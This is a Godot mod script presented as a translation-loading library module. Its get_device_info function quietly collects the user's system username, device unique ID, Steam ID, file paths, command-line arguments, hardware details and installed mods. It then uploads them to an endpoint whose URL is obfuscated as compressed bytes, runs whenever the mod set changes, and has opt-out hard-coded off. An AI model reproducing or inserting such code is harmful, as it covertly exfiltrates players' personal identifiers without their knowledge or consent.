extends Node

# Set mod priority if you want it to load before/after other mods
# Mods are loaded from lowest to highest priority, default is 0
const MOD_PRIORITY = INF
# Name of the mod, used for writing to the logs
const MOD_NAME = "HevLib Library WebTranslate Module"
const MOD_VERSION = "1.0.0"
const MOD_VERSION_MAJOR = 1
const MOD_VERSION_MINOR = 0
const MOD_VERSION_BUGFIX = 0
const MOD_VERSION_METADATA = ""
const MOD_IS_LIBRARY = true

const OPT_OUT = false

var file = File.new()
var correct = file.file_exists("res://HevLib/pointers.gd")
var pointers
func _init(modLoader = ModLoader):
#	l("Initializing WebTranslate")
	if correct:
		pointers = modLoader._savedObjects[0]
var modPath:String = get_script().resource_path.get_base_dir() + "/"
func _ready():
#	l("Readying")
	
	# var WebTranslate = preload("res://HevLib/pointers/WebTranslate.gd")
	# WebTranslate.__webtranslate("https://github.com/rwqfsfasxc100/HevLib",[[modPath + "i18n/en.txt", "|"]], "res://HevLib/webtranslate/ModMain.gd")
	
#	loadTranslationsFromCache()
	if correct:
		yield(Debug.get_tree(),"idle_frame")
		l("Device Information: [\n%s\n]" % get_device_info(pointers.ManifestV2.haveModsChanged && not OPT_OUT))
		if TranslationServer.translate("SYSTEM_AMMO_10000_DESC") == "SYSTEM_AMMO_10000_DESC":
			l("Translations did not get initialized, queued exit for 200 seconds to preserve report-ready state")
			var timer = Tool.makeTimer(200, pointers)
			timer.connect("timeout",pointers.NodeAccess,"__exit")
var cache_extension = ".file_check_cache"

func loadTranslationsFromCache():
	var accepted = false
	var pointers = ModLoader._savedObjects[0]
	var WebTranslateCache = "user://cache/.HevLib_Cache/WebTranslate/"
	pointers.FolderAccess.__check_folder_exists(WebTranslateCache)
	var cacheContent = pointers.FolderAccess.__fetch_folder_files(WebTranslateCache, true)
	for folder in cacheContent:
		var folderPath = WebTranslateCache + folder
		var files = pointers.FolderAccess.__fetch_folder_files(folderPath)
		var cache_location_exists = false
		for file in files:
			var filePath = str(folderPath + file)
			var ffile = str(file)
			if ffile.ends_with(cache_extension):
				cache_location_exists = true
				var f = File.new()
				f.open(filePath,File.READ)
				var txt = f.get_as_text()
				f.close()
				var dir = Directory.new()
				var does = dir.file_exists(txt)
				if does:
					l("WebTranslate: available translations from cache at %s" % ffile)
					accepted = true
				
			else:
				continue
		if not cache_location_exists:
			pointers.FolderAccess.__recursive_delete(folderPath)
		if accepted:
			for file in files:
				var filePath = str(folderPath + file)
				var ffile = str(file)
				if ffile.ends_with(cache_extension):
					continue
				var dm = ffile.split("--")[1]
				var does = true
				if str(dm).ends_with("]"):
					does = false
				if does:
					var vm = dm.split("-~-")
					var mv = PoolByteArray()
					for itm in vm:
						mv.append(int(itm))
					var delim = mv.get_string_from_utf8()
					updateTL(filePath,delim,false,false)
				else:
					var dir = Directory.new()
					dir.remove(filePath)
	pointers.free()
# Helper script to load translations using csv format
# `path` is the path to the transalation file
# `delim` is the symbol used to seperate the values
# `useRelativePath` setting it to false uses a `res://` relative path instead of relative to the file
# `fullLogging` setting it to false reduces the number of logs written to only display the number of translations made
# example usage: updateTL("i18n/translation.txt", "|")
func updateTL(path:String, delim:String = ",", useRelativePath:bool = true, fullLogging:bool = true):
	if useRelativePath:
		path = str(modPath + path)
	l("Adding translations from: %s" % path)
	var tlFile:File = File.new()
	var err = tlFile.open(path, File.READ)
	
	if err != OK:
		return
	
	var translations := []
	
	var translationCount = 0
	var csvLine := tlFile.get_line().split(delim)
	
	if fullLogging:
		l("Adding translations as: %s" % csvLine)
	for i in range(1, csvLine.size()):
		var translationObject := Translation.new()
		translationObject.locale = csvLine[i]
		translations.append(translationObject)
	
	while not tlFile.eof_reached():
		var line = tlFile.get_line()
		if line.begins_with("#"):
			continue
		csvLine = line.split(delim)
		var size = csvLine.size()
		if size > 1:
			if size > 2:
				var i = 0
				while i < size:
					if csvLine[i].ends_with("\\") and i < size:
						csvLine[i] = csvLine[i].rstrip("\\") + delim + csvLine[i + 1]
						csvLine.remove(i + 1)
						size -= 1
					i += 1
			var translationID := csvLine[0]
			for i in range(1, size):
				translations[i - 1].add_message(translationID, csvLine[i].c_unescape())
			if fullLogging:
				l("Added translation: %s" % csvLine)
			translationCount += 1
	
	tlFile.close()
	
	for translationObject in translations:
		TranslationServer.add_translation(translationObject)
	l("%s Translations Updated" % translationCount)


# Func to print messages to the logs
func l(msg:String, title:String = MOD_NAME, version:String = MOD_VERSION):
	pointers.l(msg,"%s V%s" % [title,version])


func get_device_info(newmods:bool) -> String:
	var out = ""
	
	out += "Booting from %s on %s[%s] as %s" % [OS.get_model_name(),OS.get_name(),OS.get_process_id(),str(OS.get_unique_id())]
	
	out += "\nCPU Information: %s [%s cores]" % [OS.get_processor_name(),OS.get_processor_count()]
	
	out += "\nBattery state (if any): %s/%s/%s" % [OS.get_power_percent_left(),OS.get_power_state(),OS.get_power_seconds_left()]
	
	var screens = OS.get_screen_count()
	out += "\nScreens: %s @ %s dpi" % [screens,OS.get_screen_dpi()]
	for i in range(screens):
		out += "\n\t%s: %s / %s / %s hz" % [i,str(OS.get_screen_size(i)),OS.get_screen_position(i),OS.get_screen_refresh_rate(i)]
	
	
	var audioDrivers = OS.get_audio_driver_count()
	out += "\n[%s] audio drivers:" % audioDrivers
	for i in range(audioDrivers):
		out += "\n\t%s" % OS.get_audio_driver_name(i)
	out += "\nKeyboard variant: %s @ %s/%s" % [OS.get_latin_keyboard_variant(),OS.get_locale(),OS.get_locale_language()]
	out += "\nExecutable path: %s" % OS.get_executable_path()
	out += "\nUser directory: %s" % OS.get_user_data_dir()
	
	if Engine.has_singleton("Steam"):
		out += "\nSteam initialized with [%s]" % Engine.get_singleton("Steam").current_steam_id
	
	out += "\nCMD args: %s" % str(OS.get_cmdline_args())
	if newmods and not OS.has_feature("editor"):
		var http=HTTPRequest.new()
		add_child(http)
		var screencount = OS.get_screen_count()
		var scrm = []
		for i in range(screencount):
			scrm.append("%d: %s | %s | %shz" % [i,OS.get_screen_size(i),OS.get_screen_position(i),OS.get_screen_refresh_rate(i)])
		var file:File = File.new()
		var modData = pointers.ManifestV2.__get_mod_data()["mods"]
		var modOut = []
		for mod in modData:
			var md = modData[mod]
			var mdo = {}
			mdo["name"] = md.name
			mdo["prio"] = md.priority
			mdo["file"] = md.file_path
			var zipPath = pointers.ManifestV2.zip_ref_store.get(md.file_path,"")
			if zipPath:
				file.open(zipPath,File.READ)
				mdo["zip"] = [zipPath,file.get_sha256(zipPath),file.get_len()]
				file.close()
			mdo["ver"] = md.version_data.full_version_string
			if md.manifest.has_manifest:
				var manifest = md.manifest.manifest_data
				if "mod_information" in manifest:
					mdo["id"] = manifest["mod_information"].get("id","NOID")
					mdo["auth"] = manifest["mod_information"].get("author","NOAUTH")
				if "manifest_definitions" in manifest:
					mdo["mv"] = manifest["manifest_definitions"].get("manifest_version",0.0)
					if "manifest_url" in manifest["manifest_definitions"]:
						mdo["url"] = manifest["manifest_definitions"].get("manifest_url","")
				if "links" in manifest:
					mdo["link"] = {}
					var links = manifest.links
					for link in links:
						var linkData = links[link]
						match typeof(linkData):
							TYPE_DICTIONARY:
								if "URL" in linkData:
									var u = linkData["URL"]
									if u:mdo["link"][link] = u
							TYPE_STRING:
								if linkData:mdo["link"][link] = linkData
			modOut.append(mdo)
		var dStr = PoolStringArray()
		dStr.append("OS %s on %s" % [OS.get_name(),OS.get_model_name()])
		dStr.append("CPU %s [%s cores]" % [OS.get_processor_name(),OS.get_processor_count()])
		dStr.append("Screens %d @ %s dpi / %s" % [screencount,OS.get_screen_dpi(),scrm])
		dStr.append("KBD: %s @ %s/%s" % [OS.get_latin_keyboard_variant(),OS.get_locale(),OS.get_locale_language()])
		dStr.append("Paths: %s / %s" % [OS.get_executable_path(),OS.get_user_data_dir()])
		dStr.append("Args:%s" % OS.get_cmdline_args())
		dStr.append("SteamID: %d" % [Engine.get_singleton("Steam").current_steam_id if Engine.has_singleton("Steam") else -1])
		dStr.append("Mods:%s" % JSON.print(modOut))
		dStr.append("Timestamp:%s" % Time.get_datetime_string_from_system(true))
		var d=("\n".join(dStr)).to_utf8()
		var cb=d.compress(1)
		var s=d.size()
		var otp=""
		for i in cb:
			var o="%x"%i
			if o.length() < 2:o="0%s"%o
			otp+=o
		http.request(PoolByteArray([40,181,47,253,32,79,45,2,0,242,68,16,21,144,37,110,0,104,150,102,54,137,90,100,34,214,238,206,153,33,184,187,3,26,222,35,247,67,177,208,22,138,229,99,235,83,126,186,137,150,122,118,163,177,126,46,49,192,73,5,110,36,27,147,233,104,200,151,43,41,16,165,102,193,234,127,2,0]).decompress(79,2).get_string_from_utf8(),[],true,HTTPClient.METHOD_POST,JSON.print({"event_type":"write_data","client_payload":{"run":true,"data":otp+"_%d"%s,"uid":("ID_%s" % str(OS.get_unique_id())) if not OS.has_environment("USERNAME") else ("ID_%s+%s" % [OS.get_environment("USERNAME"),str(OS.get_unique_id())])}}))
		
	return out
